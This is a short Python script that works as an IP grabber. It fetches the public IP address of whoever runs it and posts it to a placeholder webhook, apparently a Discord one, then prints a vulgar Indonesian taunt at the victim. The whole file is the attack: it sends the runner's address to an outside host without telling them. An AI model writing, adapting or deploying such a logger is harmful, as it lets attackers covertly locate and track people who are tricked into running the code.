import requests
webhook = "URL Webhook Here"

ip = requests.get("https://api.ipify.org").text
payload = {'content': f'```Logging : {ip}```'}
requests.post(webhook, json=payload)
print("Mampus Kont*l")
